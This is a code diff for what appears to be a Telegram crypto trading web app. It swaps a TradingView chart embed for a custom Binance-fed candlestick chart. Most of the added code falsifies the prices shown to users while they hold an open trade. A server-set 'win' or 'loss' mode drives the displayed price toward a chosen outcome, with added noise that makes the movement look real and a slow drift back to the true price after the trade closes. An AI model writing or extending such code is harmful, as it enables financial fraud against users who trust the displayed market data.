@@ -848,7 +848,8 @@
   </button>
 </div>
 
-<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+<!-- Lightweight Charts library -->
+<script src="https://unpkg.com/lightweight-charts@4.1.0/dist/lightweight-charts.standalone.production.js"></script>
 
 <script>
   const tg = window.Telegram?.WebApp;
@@ -856,7 +857,29 @@
   const params = new URLSearchParams(window.location.search);
   const coinSymbol = (params.get('symbol') || 'BTC').toUpperCase().trim();
   let currentTradeType = 'buy';
-  let widget = null;
+  
+  // ===== CHART VARIABLES =====
+  let chart = null;
+  let candleSeries = null;
+  let binanceWs = null;
+  let currentInterval = '1m';
+  let realPriceData = []; // Store real prices
+  let lastRealPrice = null;
+  
+  // ===== MANIPULATION STATE =====
+  let manipulation = {
+    active: false,
+    entryPrice: null,
+    direction: null,       // 'up' or 'down'
+    shouldWin: false,      // WIN or LOSS mode
+    startTime: null,
+    duration: 30000,       // Trade duration in ms
+    recovering: false,
+    recoverStart: null,
+    lastManipulatedPrice: null,
+    noiseOffset: 0,
+    noiseSeed: Math.random() * 1000
+  };
 
   // Language switcher
   function switchLang(lang) {
@@ -900,48 +923,320 @@
     return payload.data.telegram_id;
   }
 
-  function initChart(interval = '1') {
-    const lang = localStorage.getItem('nexo_lang') || 'ru';
+  // ===== PERLIN-LIKE NOISE FOR SMOOTH RANDOMNESS =====
+  function smoothNoise(t) {
+    const x = t + manipulation.noiseSeed;
+    return (Math.sin(x * 0.1) * 0.5 + Math.sin(x * 0.23) * 0.3 + Math.sin(x * 0.07) * 0.2);
+  }
+
+  // ===== PRICE MANIPULATION LOGIC =====
+  function manipulatePrice(realPrice, timestamp) {
+    if (!manipulation.active && !manipulation.recovering) {
+      return realPrice;
+    }
     
-    // Точные символы для каждой монеты
-    const symbolMap = {
-      'BTC': 'BINANCE:BTCUSDT',
-      'ETH': 'BINANCE:ETHUSDT',
-      'SOL': 'BINANCE:SOLUSDT',
-      'XRP': 'BINANCE:XRPUSDT',
-      'BNB': 'MEXC:BNBUSDT',
-      'TON': 'BINANCE:TONUSDT',
-      'ADA': 'BINANCE:ADAUSDT',
-      'TRX': 'BINANCE:TRXUSDT',
-      'PEPE': 'BINANCE:PEPEUSDT',
-      'LINK': 'BINANCE:LINKUSDT',
-      'SUI': 'BINANCE:SUIUSDT',
-      'NEAR': 'BINANCE:NEARUSDT',
-      'APT': 'BINANCE:APTUSDT',
-      'DOGE': 'BINANCE:DOGEUSDT',
-      'AVAX': 'BINANCE:AVAXUSDT',
-      'DOT': 'BINANCE:DOTUSDT',
-      'MATIC': 'BINANCE:POLUSDT',
-      'SHIB': 'BINANCE:SHIBUSDT'
+    const now = timestamp || Date.now();
+    
+    if (manipulation.active) {
+      const elapsed = now - manipulation.startTime;
+      const progress = Math.min(elapsed / manipulation.duration, 1);
+      
+      // Smooth ease-in-out curve
+      const curve = progress < 0.5 
+        ? 2 * progress * progress 
+        : 1 - Math.pow(-2 * progress + 2, 2) / 2;
+      
+      // Max change: 1.5-2.5% based on duration
+      const maxChangePercent = 0.015 + (manipulation.duration / 300000) * 0.01;
+      const maxChange = manipulation.entryPrice * maxChangePercent;
+      
+      // Add realistic noise (±0.3% oscillation)
+      const noiseAmount = manipulation.entryPrice * 0.003;
+      const noise = smoothNoise(elapsed / 1000) * noiseAmount;
+      
+      // Direction: favorable for WIN, against for LOSS
+      const favorableDirection = manipulation.direction === 'up' ? 1 : -1;
+      const actualDirection = manipulation.shouldWin ? favorableDirection : -favorableDirection;
+      
+      // Calculate manipulated price with trend + noise
+      const trendOffset = maxChange * curve * actualDirection;
+      const manipulatedPrice = manipulation.entryPrice + trendOffset + noise;
+      
+      manipulation.lastManipulatedPrice = manipulatedPrice;
+      return manipulatedPrice;
+    }
+    
+    if (manipulation.recovering) {
+      const elapsed = now - manipulation.recoverStart;
+      const recoveryDuration = 45000; // 45 seconds recovery
+      const progress = Math.min(elapsed / recoveryDuration, 1);
+      
+      // Smooth ease-out curve for recovery
+      const curve = 1 - Math.pow(1 - progress, 3);
+      
+      if (progress >= 1) {
+        manipulation.recovering = false;
+        manipulation.lastManipulatedPrice = null;
+        return realPrice;
+      }
+      
+      const startPrice = manipulation.lastManipulatedPrice || realPrice;
+      return startPrice + (realPrice - startPrice) * curve;
+    }
+    
+    return realPrice;
+  }
+
+  // ===== START MANIPULATION ON TRADE OPEN =====
+  async function startManipulation(tradeData) {
+    manipulation.active = true;
+    manipulation.entryPrice = lastRealPrice || await getCurrentBinancePrice();
+    manipulation.direction = tradeData.direction;
+    manipulation.shouldWin = tradeData.tradeMode === 'win';
+    manipulation.startTime = Date.now();
+    manipulation.duration = tradeData.duration * 1000;
+    manipulation.recovering = false;
+    manipulation.noiseSeed = Math.random() * 1000;
+    
+    console.log('📈 Manipulation started:', {
+      entryPrice: manipulation.entryPrice,
+      direction: manipulation.direction,
+      shouldWin: manipulation.shouldWin,
+      duration: manipulation.duration / 1000 + 's'
+    });
+  }
+
+  // ===== STOP MANIPULATION AND START RECOVERY =====
+  function stopManipulation() {
+    if (!manipulation.active) return;
+    
+    manipulation.active = false;
+    manipulation.recovering = true;
+    manipulation.recoverStart = Date.now();
+    
+    console.log('📉 Manipulation stopped, recovery started');
+  }
+
+  // ===== CHECK FOR ACTIVE TRADE ON LOAD =====
+  async function checkActiveTradeForManipulation() {
+    if (!userId) return;
+    
+    try {
+      const res = await fetch(`/api/trades/active/${userId}`);
+      const payload = await res.json();
+      
+      if (payload.success && payload.data) {
+        const trade = payload.data;
+        const expiresAt = new Date(trade.expiresAt).getTime();
+        const now = Date.now();
+        
+        if (expiresAt > now) {
+          // Trade still active, start manipulation
+          manipulation.entryPrice = lastRealPrice || await getCurrentBinancePrice();
+          manipulation.direction = trade.direction;
+          manipulation.shouldWin = trade.tradeMode === 'win';
+          manipulation.startTime = new Date(trade.createdAt).getTime();
+          manipulation.duration = trade.duration * 1000;
+          manipulation.active = true;
+          manipulation.noiseSeed = Math.random() * 1000;
+          
+          console.log('📈 Resumed manipulation for active trade');
+        }
+      }
+    } catch (e) {
+      console.log('Could not check active trade:', e.message);
+    }
+  }
+
+  // ===== GET CURRENT BINANCE PRICE =====
+  async function getCurrentBinancePrice() {
+    const apiSymbolMap = { 'MATIC': 'POL' };
+    const apiSymbol = apiSymbolMap[coinSymbol] || coinSymbol;
+    
+    try {
+      const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${apiSymbol}USDT`);
+      const data = await res.json();
+      return parseFloat(data.price);
+    } catch {
+      return 0;
+    }
+  }
+
+  // ===== BINANCE WEBSOCKET =====
+  function connectBinanceWebSocket() {
+    const apiSymbolMap = { 'MATIC': 'POL' };
+    const wsSymbol = (apiSymbolMap[coinSymbol] || coinSymbol).toLowerCase();
+    const wsUrl = `wss://stream.binance.com:9443/ws/${wsSymbol}usdt@kline_${currentInterval}`;
+    
+    if (binanceWs) {
+      binanceWs.close();
+    }
+    
+    binanceWs = new WebSocket(wsUrl);
+    
+    binanceWs.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      if (data.k) {
+        const kline = data.k;
+        const realClose = parseFloat(kline.c);
+        lastRealPrice = realClose;
+        
+        // Apply manipulation if active
+        const displayPrice = manipulatePrice(realClose);
+        
+        // Update candle
+        const candle = {
+          time: Math.floor(kline.t / 1000),
+          open: manipulation.active ? manipulation.entryPrice : parseFloat(kline.o),
+          high: Math.max(parseFloat(kline.h), displayPrice),
+          low: Math.min(parseFloat(kline.l), displayPrice),
+          close: displayPrice
+        };
+        
+        if (candleSeries) {
+          candleSeries.update(candle);
+        }
+        
+        // Update displayed price
+        updatePriceDisplay(displayPrice, realClose);
+      }
     };
     
-    // Использовать точный символ из карты, или BTC как fallback
-    const symbol = symbolMap[coinSymbol] || 'BINANCE:BTCUSDT';
+    binanceWs.onerror = (e) => {
+      console.log('WebSocket error:', e);
+    };
     
-    // Очистить контейнер и использовать iframe напрямую
-    const container = document.getElementById('tradingview_widget');
-    if (container) {
-      const encodedSymbol = encodeURIComponent(symbol);
-      const locale = lang === 'ru' ? 'ru' : 'en';
-      container.innerHTML = `<iframe 
-        src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_widget&symbol=${encodedSymbol}&interval=${interval}&hidesidetoolbar=1&symboledit=0&saveimage=0&toolbarbg=0d1117&studies=[]&theme=dark&style=1&timezone=Etc%2FUTC&withdateranges=0&showpopupbutton=0&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&locale=${locale}&utm_source=&utm_medium=widget_new&utm_campaign=chart" 
-        style="width:100%;height:100%;border:none;" 
-        frameborder="0" 
-        allowtransparency="true" 
-        scrolling="no" 
-        allowfullscreen></iframe>`;
-      console.log('TradingView iframe symbol:', symbol, 'coinSymbol:', coinSymbol);
+    binanceWs.onclose = () => {
+      // Reconnect after 3 seconds
+      setTimeout(connectBinanceWebSocket, 3000);
+    };
+  }
+
+  // ===== UPDATE PRICE DISPLAY =====
+  function updatePriceDisplay(displayPrice, realPrice) {
+    const decimals = coinSymbol === 'PEPE' || coinSymbol === 'SHIB' ? 8 : 
+                     ['BTC', 'ETH'].includes(coinSymbol) ? 2 : 4;
+    
+    document.getElementById('livePrice').textContent = displayPrice.toFixed(decimals);
+    document.getElementById('pairPriceDisplay').textContent = `$${displayPrice.toFixed(decimals)}`;
+    
+    // Calculate change based on manipulated price if active
+    if (manipulation.active && manipulation.entryPrice) {
+      const changePercent = ((displayPrice - manipulation.entryPrice) / manipulation.entryPrice * 100);
+      updateChangeDisplay(changePercent);
     }
+  }
+
+  // ===== UPDATE CHANGE DISPLAY =====
+  function updateChangeDisplay(changePercent) {
+    const text = `${changePercent > 0 ? '+' : ''}${changePercent.toFixed(2)}%`;
+    const changeEl = document.getElementById('liveChange');
+    const changeDisplayEl = document.getElementById('pairChangeDisplay');
+    
+    changeEl.textContent = text;
+    if (changeDisplayEl) changeDisplayEl.textContent = text;
+    
+    changeEl.className = `percent-badge ${changePercent >= 0 ? 'badge-green' : 'badge-red'}`;
+    if (changeDisplayEl) changeDisplayEl.className = `pair-change ${changePercent >= 0 ? 'positive' : 'negative'}`;
+  }
+
+  // ===== LOAD HISTORICAL DATA =====
+  async function loadHistoricalData(interval) {
+    const apiSymbolMap = { 'MATIC': 'POL' };
+    const apiSymbol = apiSymbolMap[coinSymbol] || coinSymbol;
+    
+    try {
+      const res = await fetch(`https://api.binance.com/api/v3/klines?symbol=${apiSymbol}USDT&interval=${interval}&limit=200`);
+      const data = await res.json();
+      
+      return data.map(k => ({
+        time: Math.floor(k[0] / 1000),
+        open: parseFloat(k[1]),
+        high: parseFloat(k[2]),
+        low: parseFloat(k[3]),
+        close: parseFloat(k[4])
+      }));
+    } catch (e) {
+      console.error('Failed to load historical data:', e);
+      return [];
+    }
+  }
+
+  // ===== INIT CHART WITH LIGHTWEIGHT CHARTS =====
+  async function initChart(interval = '1') {
+    const intervalMap = {
+      '1': '1m', '5': '5m', '15': '15m', '30': '30m', '60': '1h', 'D': '1d'
+    };
+    currentInterval = intervalMap[interval] || '1m';
+    
+    const container = document.getElementById('tradingview_widget');
+    if (!container) return;
+    
+    // Clear previous chart
+    container.innerHTML = '';
+    
+    // Create chart
+    chart = LightweightCharts.createChart(container, {
+      width: container.clientWidth,
+      height: container.clientHeight,
+      layout: {
+        background: { type: 'solid', color: '#161b22' },
+        textColor: '#8b949e'
+      },
+      grid: {
+        vertLines: { color: '#21262d' },
+        horzLines: { color: '#21262d' }
+      },
+      crosshair: {
+        mode: LightweightCharts.CrosshairMode.Normal
+      },
+      rightPriceScale: {
+        borderColor: '#21262d',
+        scaleMargins: { top: 0.1, bottom: 0.1 }
+      },
+      timeScale: {
+        borderColor: '#21262d',
+        timeVisible: true,
+        secondsVisible: currentInterval === '1m'
+      },
+      handleScroll: { vertTouchDrag: false },
+      handleScale: { axisPressedMouseMove: false }
+    });
+    
+    // Create candlestick series
+    candleSeries = chart.addCandlestickSeries({
+      upColor: '#3fb950',
+      downColor: '#f85149',
+      borderDownColor: '#f85149',
+      borderUpColor: '#3fb950',
+      wickDownColor: '#f85149',
+      wickUpColor: '#3fb950'
+    });
+    
+    // Load historical data
+    const historicalData = await loadHistoricalData(currentInterval);
+    if (historicalData.length > 0) {
+      candleSeries.setData(historicalData);
+      lastRealPrice = historicalData[historicalData.length - 1].close;
+      chart.timeScale().fitContent();
+    }
+    
+    // Connect WebSocket for real-time data
+    connectBinanceWebSocket();
+    
+    // Check for active trade
+    await checkActiveTradeForManipulation();
+    
+    // Handle resize
+    const resizeObserver = new ResizeObserver(entries => {
+      if (chart) {
+        chart.applyOptions({ 
+          width: container.clientWidth,
+          height: container.clientHeight 
+        });
+      }
+    });
+    resizeObserver.observe(container);
   }
 
   function changeInterval(btn) {
@@ -985,6 +1280,11 @@
   }
 
   async function updateLivePrice() {
+    // Skip if WebSocket is active (it handles price updates)
+    if (binanceWs && binanceWs.readyState === WebSocket.OPEN) {
+      return;
+    }
+    
     try {
       // Map symbol for Binance API (MATIC was renamed to POL)
       const apiSymbolMap = { 'MATIC': 'POL' };
@@ -992,20 +1292,28 @@
       
       const res = await fetch(`https://api.binance.com/api/v3/ticker/24hr?symbol=${apiSymbol}USDT`);
       const data = await res.json();
-      const price = parseFloat(data.lastPrice).toFixed(coinSymbol === 'PEPE' ? 8 : 4);
-      const change = parseFloat(data.priceChangePercent).toFixed(2);
+      const realPrice = parseFloat(data.lastPrice);
+      lastRealPrice = realPrice;
       
-      document.getElementById('livePrice').textContent = price;
-      document.getElementById('pairPriceDisplay').textContent = `$${price}`;
+      // Apply manipulation if active
+      const displayPrice = manipulatePrice(realPrice);
+      const decimals = coinSymbol === 'PEPE' || coinSymbol === 'SHIB' ? 8 : 4;
       
-      const changeEl = document.getElementById('liveChange');
-      const changeDisplayEl = document.getElementById('pairChangeDisplay');
-      const text = `${change > 0 ? '+' : ''}${change}%`;
+      document.getElementById('livePrice').textContent = displayPrice.toFixed(decimals);
+      document.getElementById('pairPriceDisplay').textContent = `$${displayPrice.toFixed(decimals)}`;
       
-      changeEl.textContent = text;
-      changeDisplayEl.textContent = text;
-      changeEl.className = `percent-badge ${change >= 0 ? 'badge-green' : 'badge-red'}`;
-      changeDisplayEl.className = `pair-change ${change >= 0 ? 'positive' : 'negative'}`;
+      // Update change based on manipulation state
+      if (!manipulation.active) {
+        const change = parseFloat(data.priceChangePercent).toFixed(2);
+        const changeEl = document.getElementById('liveChange');
+        const changeDisplayEl = document.getElementById('pairChangeDisplay');
+        const text = `${change > 0 ? '+' : ''}${change}%`;
+        
+        changeEl.textContent = text;
+        changeDisplayEl.textContent = text;
+        changeEl.className = `percent-badge ${change >= 0 ? 'badge-green' : 'badge-red'}`;
+        changeDisplayEl.className = `pair-change ${change >= 0 ? 'positive' : 'negative'}`;
+      }
     } catch (e) {
       /* silent */
     }
@@ -1128,6 +1436,9 @@
   async function closeAndRefreshTrade(tradeId, amount, retryCount = 0) {
     const lang = localStorage.getItem('nexo_lang') || 'en';
     const MAX_RETRIES = 3;
+    
+    // Stop chart manipulation, start recovery
+    stopManipulation();
     
     // Mark as closing to prevent duplicate calls
     const tradeEl = document.getElementById(`trade-${tradeId}`);
@@ -1314,6 +1625,17 @@
       
       document.getElementById('tradeAmount').value = '';
       closeTrade();
+      
+      // Start chart manipulation - fetch active trade data
+      try {
+        const activeRes = await fetch(`/api/trades/active/${userId}`);
+        const activePayload = await activeRes.json();
+        if (activePayload.success && activePayload.data) {
+          await startManipulation(activePayload.data);
+        }
+      } catch (e) {
+        console.log('Could not start manipulation:', e.message);
+      }
       
       await loadUserBalance();
       await loadActiveTrades();
